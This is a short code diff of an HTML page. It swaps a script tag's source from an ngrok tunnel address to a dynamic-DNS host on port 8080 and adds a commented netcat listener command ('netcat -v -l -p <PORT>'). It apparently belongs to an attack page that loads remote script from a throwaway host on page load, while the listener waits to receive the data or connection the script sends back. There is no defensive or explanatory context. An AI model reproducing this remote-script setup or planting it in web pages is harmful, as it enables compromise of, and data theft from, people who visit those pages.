@@ -9,7 +9,7 @@
 
     }
     </script>
-    <script src="http://6210-103-125-235-21.ngrok.io"></script>
+    <script src="http://whiteavocado.ddns.net:8080"></script>
     </head>
 
     <body onload="load()">
@@ -39,3 +39,6 @@
 //    <body onload="load()">
 //    </body>
 //    </html> 
+
+
+//netcat -v -l -p <PORT>
